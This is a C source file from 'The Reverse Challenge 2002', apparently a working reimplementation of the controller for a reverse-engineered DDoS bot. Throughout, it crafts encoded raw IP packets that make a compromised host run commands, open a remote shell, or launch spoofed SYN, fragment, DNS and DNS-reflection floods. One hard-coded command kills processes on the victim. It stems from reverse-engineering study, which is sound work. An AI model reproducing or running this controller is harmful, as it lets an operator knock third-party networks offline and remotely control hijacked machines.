/* The Reverse Challenge 2002
   Copyright (C) 2002 Marcin Gozdalik <gozdal@gozdal.eu.org>
   control.c - Controller for the DDoS binary
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include "ip.h"

#define CMD_STATUS		1
#define CMD_REGISTER		2
#define CMD_EXECUTE_OUTPUT	3
#define CMD_DOS_REFLECT_DNS	4
#define CMD_FRAG_FLOOD		5
#define CMD_SHELL		6
#define CMD_EXECUTE_NOOUTPUT	7
#define CMD_KILL_CHILD		8
#define CMD_DOS_REFLECT_DNS2	9
#define CMD_SYN_FLOOD		10
#define CMD_SYN_FLOOD2		11
#define CMD_FLOOD_DNS		12

// this is the protocol the tool uses
#define DDOS_IP_PROTO	0xb
#define uchar unsigned char
#define in_addr_t unsigned long

in_addr_t srcaddr, dstaddr;
uchar zero = 0;
int one = 1;

/* both encode and decode try to follow the-binary as close as possible */
void encode(uchar *encoded, uchar *data, int len)
{
	int i;
	
	encoded[0] = zero;
	sprintf(encoded, "%c", data[0]+0x17);
	for (i = 1; i < len; i++)
		encoded[i] = data[i]+encoded[i-1]+0x17;
}

void decode(uchar *decoded, uchar *data, int len)
{
	int i = len-1, j, k;
	uchar tmp[len];
	uchar c;
	
	decoded[0] = zero;
	while (i >= 0) {
		j = i-1;
		if (i) c = data[i]-data[j]; else c = data[0];
		k = c - 0x17;
		while (k < 0) k += 0x100;
		j = 0;
		while (j < len) { tmp[j] = decoded[j]; j++; }
		decoded[0] = k;
		j = 1;
		while (j < len) { decoded[j] = tmp[j-1]; j++; }
		sprintf(decoded, "%c%s", k, tmp);
		i--;
	}
}

int create_rawsocket()
{
	int sockfd;
	
	sockfd = socket(AF_INET, SOCK_RAW, DDOS_IP_PROTO);
	setsockopt(sockfd, IP, IP_HDRINCL, &one, sizeof(one));

	return sockfd;
}

int send_packet(int sockfd, in_addr_t dstaddr, in_addr_t srcaddr, uchar *data, int len)
{
	uchar tmp[len+sizeof(struct ip) + sizeof(u16)];
	struct ip *head = (struct ip *)tmp;
	u16 *sig = (u16 *)(tmp + sizeof(struct ip));
	uchar *payload = (uchar *)(tmp + sizeof(struct ip) + sizeof(u16));
	struct sa sin;

	sin.fam = AF_INET;
	sin.dp = 0;
	sin.add = dstaddr;

	encode(payload, data, len);
	
	head->ver = 4;
	head->ihl = 5;
	head->tos = 0x00;
	head->tl = sizeof(struct ip) + len;
	head->id = htons(random()%65536);
	head->off = 0;
	head->ttl = random()%130 + 120;
	head->src = srcaddr;
	head->dst = dstaddr;
	head->pro = DDOS_IP_PROTO;
	head->sum = 0;
	head->sum = cksum((u16 *)head, sizeof(struct ip) >> 1);

	*sig = 2;
	return sendto(sockfd, tmp, len+sizeof(struct ip), 0, (struct sockaddr *)&sin, sizeof(sin));
}

int recv_packet(int sockfd, uchar *buf, int len)
{
	uchar tmp[len+sizeof(struct ip)+sizeof(u16)];
	struct ip *head = (struct ip *)tmp;
	u16 *sig = (u16 *)(tmp + sizeof(struct ip));
	uchar *payload = (uchar *)(tmp + sizeof(struct ip)+sizeof(u16));
	int got;

	got = recv(sockfd, tmp, len+sizeof(struct ip)+sizeof(u16), 0);
	if (got <= 0) return -1;
	if (head->pro != DDOS_IP_PROTO) return -1;
	if ((*sig & 0xff) != 3) return -1;
	decode(buf, payload, got-sizeof(struct ip)-sizeof(u16));

	return got;
}

int get_status(int sockfd)
{
	uchar buf[610];
	int code, ret;
	
	buf[1] = CMD_STATUS;
	send_packet(sockfd, dstaddr, srcaddr, buf, 210);
	ret = recv_packet(sockfd, buf, 610);
	if (ret == -1) {
		fprintf(stderr, "Error while getting status\n");
		return -1;
	}
	if (buf[1] != 1 || buf[2] != 7) {
		fprintf(stderr, "Wrong signature\n");
		return -1;
	}
	printf("Currently ");
	if (!buf[3]) printf("not ");
	printf("flooding");
	if (buf[3]) printf(" - type %i\n", buf[4]);
	printf("\n");
}

int execute_output(int sockfd, char *cmd)
{
	uchar buf[610];
	int code, ret;
	
	cmd[1] = CMD_EXECUTE_OUTPUT;
	if (send_packet(sockfd, dstaddr, srcaddr, cmd, 605) == -1) return -1;
	do {
		ret = recv_packet(sockfd, buf, 610);
		buf[400] = 0;
		printf("%s", buf+2);
	} while (buf[2]);
}

int execute_nooutput(int sockfd, char *cmd)
{
	cmd[1] = CMD_EXECUTE_NOOUTPUT;
	return send_packet(sockfd, dstaddr, srcaddr, cmd, 605);
}

int execute(int sockfd)
{
	uchar buf[410];
	int code, ret;
	char c, *ptr;
	
	printf("Enter command: ");
	fgets(buf+2, 400, stdin);
	printf("Do you want to see the output? (y/n)");
	c = tolower(getchar()); getchar();
	if (c == 'y') execute_output(sockfd, buf);
	else execute_nooutput(sockfd, buf);
}

int terminate(int sockfd)
{
	uchar buf[210];
	
	strcpy(buf+2, "ps T | grep mingetty | cut -d \\  -f 2 | xargs kill -9\n");
	return execute_nooutput(sockfd, buf);
}

int shell(int sockfd)
{
	uchar buf[210];

	buf[1] = CMD_SHELL;
	send_packet(sockfd, dstaddr, srcaddr, buf, 210);
}

int kill_child(int sockfd)
{
	uchar buf[210];

	buf[1] = CMD_KILL_CHILD;
	send_packet(sockfd, dstaddr, srcaddr, buf, 210);
}

int register_controller(int sockfd)
{
	uchar buf[210];
	in_addr_t *addrptr = (in_addr_t *)(buf+3);

	buf[1] = CMD_REGISTER;
	buf[2] = 0; // register just one address, the response will be sent only to this address
	*addrptr = srcaddr;
	send_packet(sockfd, dstaddr, srcaddr, buf, 210);
}

int dos_reflect_dns(int sockfd, char *hostname, int got_hostname, short port, in_addr_t targetip)
{
	uchar buf[410];
	in_addr_t *addr = (in_addr_t *)(buf+2);
	short *portptr = (short *)(buf+6);
	
	buf[1] = CMD_DOS_REFLECT_DNS;
	*addr = targetip;
	*portptr = htons(port);
	buf[8] = got_hostname;
	strncpy(buf+9, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

int frag_flood(int sockfd, char *hostname, int udp_or_icmp, int got_hostname, in_addr_t srcip, in_addr_t targetip,
		char udpport)
{
	uchar buf[410];
	in_addr_t *targetaddr = (in_addr_t *)(buf+4);
	in_addr_t *sourceaddr = (in_addr_t *)(buf+8);

	buf[1] = CMD_FRAG_FLOOD;
	buf[2] = udp_or_icmp;
	buf[3] = udpport;
	*targetaddr = targetip;
	*sourceaddr = srcip;
	buf[12] = got_hostname;
	strncpy(buf+13, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

int dos_reflect_dns2(int sockfd, char *hostname, int got_hostname, short port, int sleep_after, in_addr_t targetip)
{
	uchar buf[410];
	in_addr_t *addr = (in_addr_t *)(buf+2);
	short *portptr = (short *)(buf+7);
	
	buf[1] = CMD_DOS_REFLECT_DNS2;
	*addr = targetip;
	buf[6] = sleep_after;
	*portptr = htons(port);
	buf[9] = got_hostname;
	strncpy(buf+10, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

int syn_flood(int sockfd, char *hostname, int got_hostname, int got_src, in_addr_t srcip, in_addr_t targetip,
		short port)
{
	uchar buf[410];
	in_addr_t *targetaddr = (in_addr_t *)(buf+2);
	in_addr_t *sourceaddr = (in_addr_t *)(buf+9);
	short *portptr = (short *)(buf+6);

	buf[1] = CMD_SYN_FLOOD;
	*targetaddr = targetip;
	*sourceaddr = srcip;
	*portptr = htons(port);
	buf[8] = got_src;
	buf[13] = got_hostname;
	strncpy(buf+14, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

int syn_flood2(int sockfd, char *hostname, int got_hostname, int sleep_after, int got_src, 
		in_addr_t srcip, in_addr_t targetip, short port)
{
	uchar buf[410];
	in_addr_t *targetaddr = (in_addr_t *)(buf+2);
	in_addr_t *sourceaddr = (in_addr_t *)(buf+9);
	short *portptr = (short *)(buf+6);

	buf[1] = CMD_SYN_FLOOD2;
	*targetaddr = targetip;
	*sourceaddr = srcip;
	*portptr = htons(port);
	buf[8] = got_src;
	buf[13] = sleep_after;
	buf[14] = got_hostname;
	strncpy(buf+15, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

int flood_dns(int sockfd, char *hostname, int got_hostname, short port, int sleep_after, in_addr_t targetip, in_addr_t srcip)
{
	uchar buf[410];
	in_addr_t *targetaddr = (in_addr_t *)(buf+2);
	in_addr_t *sourceaddr = (in_addr_t *)(buf+6);
	short *portptr = (short *)(buf+11);
	
	buf[1] = CMD_FLOOD_DNS;
	*targetaddr = targetip;
	*sourceaddr = srcip;
	buf[10] = sleep_after;
	*portptr = htons(port);
	buf[13] = got_hostname;
	strncpy(buf+14, hostname, 255);
	send_packet(sockfd, dstaddr, srcaddr, buf, 410);
}

/* the binary has a list of > 11000 DNS servers worldwide
 * and a list of 10 queries (some of them are buggy)
 * in this attack 9 of them are used
 * in the very first pass a random starting point in the list of
 * DNS servers is chosen (a number in range [0..7999])
 * then a query is sent to current DNS server
 * an index in the DNS server list is incremented, and the same query
 * is sent to the next DNS sever
 * if end of the list is reached next query is taken and the list of
 * DNS servers is traversed from the beginning
 * if end of the list of queries is reached the process starts all over
 * again
 * between subsequent sendto's some delays are introduced but it's not especially
 * important
 * ttl in the packet is random()130+120
 * id is (random()%255) << 8
 * UDP checksum is not calculated
 */

int attack_reflect_dns(int sockfd)
{	
	char c, buf[300], buf2[100], *cptr;
	in_addr_t addr;
	int ok = 1, sleep_after, got_hostname;
	short port;
	
	do {
		printf("Attack on IP or hostname? (i/h) ");
		c = tolower(getchar()); getchar();
	} while (c != 'i' && c != 'h');
	got_hostname = (c=='h');
	do {
		if (!got_hostname) printf("Enter IP: "); else printf("Enter hostname: ");
		fgets(buf, 255, stdin);
		cptr = (char *)strchr(buf, '\n');
		*cptr = 0;
		if (!got_hostname) ok = ((addr = inet_addr(buf)) != -1);
	} while (!ok);
	printf("UDP port (0 for random): ");
	fgets(buf2, 10, stdin);
	port = atoi(buf2);
	do {
		printf("How many packets between sleeps (0 to sleep after every packet): ");
		fgets(buf2, 10, stdin);
		sleep_after = atoi(buf2);
		ok = (sleep_after >= 0) && (sleep_after <= 255);
	} while (!ok);
	if (sleep_after)
		return dos_reflect_dns2(sockfd, buf, got_hostname, port, sleep_after, addr);
	else
		return dos_reflect_dns(sockfd, buf, got_hostname, port, addr);
}

int attack_flood_dns(int sockfd)
{
	char c, buf[300], buf2[100], *cptr;
	in_addr_t addr, dnsaddr = 0;
	int ok = 1, sleep_after, got_hostname;
	short port;
	
	do {
		printf("Attack on IP or hostname? (i/h) ");
		c = tolower(getchar()); getchar();
	} while (c != 'i' && c != 'h');
	got_hostname = (c=='h');
	do {
		if (!got_hostname) printf("Enter DNS IP: "); else printf("Enter DNS hostname: ");
		fgets(buf, 255, stdin);
		cptr = (char *)strchr(buf, '\n');
		*cptr = 0;
		if (!got_hostname) ok = ((dnsaddr = inet_addr(buf)) != -1);
	} while (!ok);
	do {
		printf("Enter source IP (0 for random): ");
		fgets(buf2, 20, stdin);
		ok = ((addr = inet_addr(buf2)) != -1);
	} while (!ok);
	printf("UDP port (0 for random): ");
	fgets(buf2, 10, stdin);
	port = atoi(buf2);
	do {
		printf("How many packets between sleeps (0 to sleep after every packet): ");
		fgets(buf2, 10, stdin);
		sleep_after = atoi(buf2);
		ok = (sleep_after >= 0) && (sleep_after <= 255);
	} while (!ok);
	return flood_dns(sockfd, buf, got_hostname, port, sleep_after, dnsaddr, addr);
}

/* send a continuous flow of datagrams - either UDP or ICMP
 * the IP options are set so that the datagrams looks as if it
 * was a part of a fragmented IP packet (1109:9@65520)
 * in fact the payload is either UDP or ICMP header, however
 * it's not relevant
 * TOS is random (not really, it's simply not initialized, so it's
 * stack garbage)
 * ttl is random()%130+120
 * total len is set to 0x281c
 * id is set to 0x455
 * if the attack is against hostname after 80000 packets tries to
 * resolve the hostname again so it floods all of the IPs
 * in case of round robin DNS 
 */
int attack_frag_flood(int sockfd)
{
	char c, buf[300], buf2[100], *cptr;
	in_addr_t targetaddr, srcaddr;
	int ok = 1, udp_or_icmp;
	short port;
	
	do {
		printf("UDP or ICMP? (u/i) ");
		c = tolower(getchar()); getchar();
	} while (c != 'i' && c != 'u');
	udp_or_icmp = (c == 'u');
	do {
		printf("Attack on IP or hostname? (i/h) ");
		c = tolower(getchar()); getchar();
	} while (c != 'i' && c != 'h');
	do {
		if (c == 'i') printf("Enter IP: "); else printf("Enter hostname: ");
		fgets(buf, 255, stdin);
		cptr = (char *)strchr(buf, '\n');
		*cptr = 0;
		if (c == 'i') ok = ((targetaddr = inet_addr(buf)) != -1);
	} while (!ok);
	do {
		printf("Enter spoofed packet source: ");
		fgets(buf2, 20, stdin);
		ok = ((srcaddr = inet_addr(buf2)) != -1);
	} while (!ok);
	if (udp_or_icmp) {
		printf("UDP port: ");
		fgets(buf2, 10, stdin);
		port = atoi(buf2);
	}
	return frag_flood(sockfd, buf, udp_or_icmp, c=='h', srcaddr, targetaddr, port);
}

/* floods the destination with SYN packets
 * the source address can be fixed or random
 * source port is always random()%40000 + 1
 * destination port is given
 * checksum is correctly calculated
 * IP ID is random()%3089 + 2
 * TCP Window is random()%1401+200
 * TCP ISN is random()%400000000 + 1
 * IP TTL random()%116 + 125
 * no payload
 * after 40000 sleeps the hostname is resolved again
 */
int attack_syn_flood(int sockfd)
{
	char c, buf[300], buf2[100], *cptr;
	in_addr_t targetaddr, srcaddr;
	int ok = 1, sleep_after, got_hostname;
	short port;
	
	do {
		printf("Attack on IP or hostname? (i/h) ");
		c = tolower(getchar()); getchar();
	} while (c != 'i' && c != 'h');
	got_hostname = (c=='h');
	do {
		if (c == 'i') printf("Enter IP: "); else printf("Enter hostname: ");
		fgets(buf, 255, stdin);
		cptr = (char *)strchr(buf, '\n');
		*cptr = 0;
		if (c == 'i') ok = ((targetaddr = inet_addr(buf)) != -1);
	} while (!ok);
	printf("Destination TCP port: ");
	fgets(buf2, 10, stdin);
	port = atoi(buf2);
	do {
		printf("Enter spoofed packet source (0 for random source): ");
		fgets(buf2, 20, stdin);
		ok = ((srcaddr = inet_addr(buf2)) != -1);
	} while (!ok);
	do {
		printf("How many packets between sleeps (0 to sleep after every packet): ");
		fgets(buf2, 10, stdin);
		sleep_after = atoi(buf2);
		ok = (sleep_after >= 0) && (sleep_after <= 255);
	} while (!ok);
	if (sleep_after)
		return syn_flood2(sockfd, buf, got_hostname, sleep_after, (srcaddr != 0), srcaddr, targetaddr, port);
	else
		return syn_flood(sockfd, buf, got_hostname, (srcaddr != 0), srcaddr, targetaddr, port);
}

int main(int argc, char **argv)
{
	int sockfd;
	char c;
	
	if (argc < 3) {
		fprintf(stderr, "Usage: control [srcIP] [dstIP]\n");
		return 1;
	}
	
	srandom(time(NULL));
	sockfd = create_rawsocket();
	
	srcaddr = inet_addr(argv[1]);
	dstaddr = inet_addr(argv[2]);
	
	register_controller(sockfd);
	do {
		printf("Choose:\n");
		printf("  (e)xecute command\n");
		printf("  spawn s(h)ell\n");
		printf("  (k)ill the child (flood or shell)\n");
		printf("  destro(y) the DDoS process\n");
		printf("  (D)NS flood\n");
		printf("  DNS (r)eflection attack\n");
		printf("  (f)ragment flood\n");
		printf("  (T)CP SYN flood\n");
		printf("  (s)tatus\n");
		printf("  (q)uit\n");
		c = tolower(getchar());
		getchar();
		switch (c) {
			case 's': get_status(sockfd); break;
			case 'h': shell(sockfd); break;
			case 'k': kill_child(sockfd); break;
			case 'e': execute(sockfd); break;
			case 'y': terminate(sockfd); c = 'q'; break;
			case 'd': attack_flood_dns(sockfd); break;
			case 'r': attack_reflect_dns(sockfd); break;
			case 'f': attack_frag_flood(sockfd); break;
			case 't': attack_syn_flood(sockfd); break;
			case 'q': break;
			default: break;
		}
	} while (c != 'q');
	
	close(sockfd);
	
	return 0;
}
